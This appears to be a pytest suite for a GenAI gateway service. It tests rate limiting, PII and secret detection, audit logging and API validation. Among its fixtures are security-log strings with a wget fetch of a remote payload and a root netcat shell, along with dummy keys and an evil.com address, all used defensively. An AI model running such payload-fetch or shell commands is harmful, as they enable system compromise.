"""
Tests for Phase 4: Secure GenAI Gateway.

Three layers:
  Layer 1 -- Pure unit tests on RateLimiter and PiiDetector (no network, no FastAPI)
  Layer 2 -- API contract tests via FastAPI TestClient (no Gemini API key needed)
  Layer 3 -- Policy enforcement: PII rejection, rate limiting, audit log integrity

The /chat endpoint requires a real GEMINI_API_KEY to return 200. All tests that
call /chat without a key expect a 503 (no key configured) -- this is the correct
behavior and the test suite passes without any external credentials.

HOW TO RUN:
    pytest services/genai-gateway/test_gateway.py -v
"""

import sys
import os
import time

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.join(os.path.dirname(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "tools", "dataset-ingestor"))

from rate_limiter import RateLimiter, _Bucket
from pii_detector import scan, is_clean, detected_types
from gateway import app, _audit_log

client = TestClient(app)


# ===========================================================================
# LAYER 1A -- RateLimiter unit tests
# ===========================================================================

class TestTokenBucket:

    def test_fresh_bucket_allows_first_request(self):
        rl = RateLimiter(rate_per_minute=60, burst=10)
        assert rl.allow("caller-a") is True

    def test_burst_allows_multiple_rapid_requests(self):
        rl = RateLimiter(rate_per_minute=60, burst=5)
        results = [rl.allow("caller-b") for _ in range(5)]
        assert all(results)

    def test_exceeding_burst_is_rejected(self):
        rl = RateLimiter(rate_per_minute=60, burst=3)
        for _ in range(3):
            rl.allow("caller-c")
        # 4th request should be rejected (bucket empty)
        assert rl.allow("caller-c") is False

    def test_different_callers_have_independent_buckets(self):
        rl = RateLimiter(rate_per_minute=60, burst=2)
        for _ in range(2):
            rl.allow("caller-d")
        # caller-d is exhausted; caller-e should still be allowed
        assert rl.allow("caller-d") is False
        assert rl.allow("caller-e") is True

    def test_tokens_refill_over_time(self):
        rl = RateLimiter(rate_per_minute=600, burst=1)  # 10 tokens/sec
        rl.allow("caller-f")   # exhaust
        assert rl.allow("caller-f") is False
        time.sleep(0.12)       # refill ~1.2 tokens at 10/sec
        assert rl.allow("caller-f") is True

    def test_available_returns_non_negative(self):
        rl = RateLimiter(rate_per_minute=60, burst=5)
        for _ in range(5):
            rl.allow("caller-g")
        assert rl.available("caller-g") >= 0.0

    def test_new_caller_returns_burst_capacity_available(self):
        rl = RateLimiter(rate_per_minute=60, burst=8)
        assert rl.available("brand-new-caller") == 8.0


# ===========================================================================
# LAYER 1B -- PiiDetector unit tests
# ===========================================================================

class TestPiiDetector:

    def test_clean_text_returns_empty(self):
        assert scan("The quick brown fox jumped over the lazy dog.") == []

    def test_ssn_detected(self):
        types = detected_types("My SSN is 123-45-6789 do not share it.")
        assert "ssn" in types

    def test_email_detected(self):
        types = detected_types("Contact me at attacker@evil.com for ransom.")
        assert "email" in types

    def test_aws_access_key_detected(self):
        types = detected_types("Key: AKIAIOSFODNN7EXAMPLE in the config.")
        assert "aws_access_key" in types

    def test_private_key_pem_detected(self):
        types = detected_types("-----BEGIN RSA PRIVATE KEY----- data here")
        assert "private_key_pem" in types

    def test_credit_card_visa_detected(self):
        types = detected_types("Card: 4111111111111111 was used.")
        assert "credit_card" in types

    def test_password_field_detected(self):
        types = detected_types("Set password=hunter2 in the config.")
        assert "password_field" in types

    def test_secret_field_detected(self):
        types = detected_types("My secret: supersecretvalue123")
        assert "secret_field" in types

    def test_openai_key_detected(self):
        types = detected_types("Use sk-abcdefghijklmnopqrstuvwxyz1234 for auth.")
        assert "openai_api_key" in types

    def test_is_clean_true_for_safe_text(self):
        assert is_clean("This is a normal incident description with no secrets.") is True

    def test_is_clean_false_for_pii_text(self):
        assert is_clean("My SSN 123-45-6789 is in this prompt.") is False

    def test_multiple_pii_types_returned(self):
        types = detected_types(
            "User: attacker@evil.com SSN: 123-45-6789 key: AKIAIOSFODNN7EXAMPLE"
        )
        assert len(types) >= 2

    def test_phone_us_detected(self):
        types = detected_types("Call me at 555-867-5309 immediately.")
        assert "phone_us" in types

    def test_safe_log_description_passes(self):
        text = (
            "Process bash with args /bin/bash -c wget http://10.0.0.1/payload "
            "spawned from parent PID 1234, user_id 0 (root), return_value -1."
        )
        assert is_clean(text) is True


# ===========================================================================
# LAYER 2 -- API contract tests
# ===========================================================================

class TestHealth:

    def test_returns_200(self):
        assert client.get("/health").status_code == 200

    def test_status_is_ok(self):
        data = client.get("/health").json()
        assert data["status"] == "ok"

    def test_gemini_configured_is_boolean(self):
        data = client.get("/health").json()
        assert isinstance(data["gemini_configured"], bool)

    def test_rate_limit_rpm_present(self):
        data = client.get("/health").json()
        assert "rate_limit_rpm" in data
        assert data["rate_limit_rpm"] > 0

    def test_burst_present(self):
        data = client.get("/health").json()
        assert "burst" in data


class TestAuditLog:

    def test_returns_200(self):
        assert client.get("/audit-log").status_code == 200

    def test_has_entries_list(self):
        data = client.get("/audit-log").json()
        assert "entries" in data
        assert isinstance(data["entries"], list)

    def test_has_count_field(self):
        data = client.get("/audit-log").json()
        assert "count" in data

    def test_limit_out_of_range_returns_422(self):
        assert client.get("/audit-log?limit=0").status_code == 422


# ===========================================================================
# LAYER 3 -- Policy enforcement tests
# ===========================================================================

class TestPiiRejection:
    """PII in any message must be rejected before reaching the LLM."""

    def _chat(self, content: str, caller: str = "test-caller") -> dict:
        return client.post("/chat", json={
            "messages": [{"role": "user", "content": content}],
            "caller_id": caller,
        })

    def test_ssn_in_prompt_returns_422(self):
        resp = self._chat("Analyze this event. My SSN is 123-45-6789.")
        assert resp.status_code == 422

    def test_422_body_contains_pii_detected_error(self):
        resp = self._chat("Config has password=supersecret123 set.")
        assert resp.status_code == 422
        detail = resp.json()["detail"]
        assert detail["error"] == "pii_detected"

    def test_422_body_lists_pii_types(self):
        resp = self._chat("My SSN is 123-45-6789.")
        assert resp.status_code == 422
        types = resp.json()["detail"]["types"]
        assert isinstance(types, list)
        assert "ssn" in types

    def test_private_key_in_prompt_returns_422(self):
        resp = self._chat("Key content: -----BEGIN RSA PRIVATE KEY-----")
        assert resp.status_code == 422

    def test_clean_prompt_passes_pii_check(self):
        # No GEMINI_API_KEY in test env -> 503, NOT 422.
        # 503 means PII check passed; 422 means PII blocked it.
        resp = self._chat("Summarize this security event: bash spawned nc at uid 0.")
        assert resp.status_code in (200, 503)

    def test_pii_blocked_adds_to_audit_log(self):
        initial_count = len(list(_audit_log))
        self._chat("My SSN is 123-45-6789.", caller="audit-test")
        assert len(list(_audit_log)) == initial_count + 1

    def test_pii_audit_entry_has_blocked_pii_true(self):
        _audit_log.clear()
        self._chat("My SSN is 123-45-6789.", caller="audit-test-2")
        entry = list(_audit_log)[-1]
        assert entry.blocked_pii is True
        assert entry.success is False


class TestChatContract:
    """API contract checks that do not require a real Gemini key."""

    def test_missing_messages_returns_422(self):
        resp = client.post("/chat", json={"caller_id": "x"})
        assert resp.status_code == 422

    def test_invalid_role_returns_422(self):
        resp = client.post("/chat", json={
            "messages": [{"role": "admin", "content": "hello"}],
            "caller_id": "x",
        })
        assert resp.status_code == 422

    def test_empty_content_returns_422(self):
        resp = client.post("/chat", json={
            "messages": [{"role": "user", "content": ""}],
            "caller_id": "x",
        })
        assert resp.status_code == 422

    def test_temperature_out_of_range_returns_422(self):
        resp = client.post("/chat", json={
            "messages": [{"role": "user", "content": "hello"}],
            "caller_id": "x",
            "temperature": 5.0,
        })
        assert resp.status_code == 422

    def test_max_tokens_out_of_range_returns_422(self):
        resp = client.post("/chat", json={
            "messages": [{"role": "user", "content": "hello"}],
            "caller_id": "x",
            "max_output_tokens": 99999,
        })
        assert resp.status_code == 422

    def test_no_api_key_returns_503_not_500(self):
        # Without GEMINI_API_KEY set, the gateway should return 503 (not 500).
        # 503 = "LLM service unavailable"; 500 = unexpected crash.
        resp = client.post("/chat", json={
            "messages": [{"role": "user", "content": "Summarize this event for me."}],
            "caller_id": "test-503",
        })
        assert resp.status_code in (200, 503)

    def test_multiple_messages_accepted(self):
        resp = client.post("/chat", json={
            "messages": [
                {"role": "system",    "content": "You are a security analyst."},
                {"role": "user",      "content": "Explain what a reverse shell is."},
                {"role": "assistant", "content": "A reverse shell is..."},
                {"role": "user",      "content": "How do I detect it?"},
            ],
            "caller_id": "multi-turn-test",
        })
        # Either 200 (key present) or 503 (no key) -- not 422 (no PII) or 400
        assert resp.status_code in (200, 503)
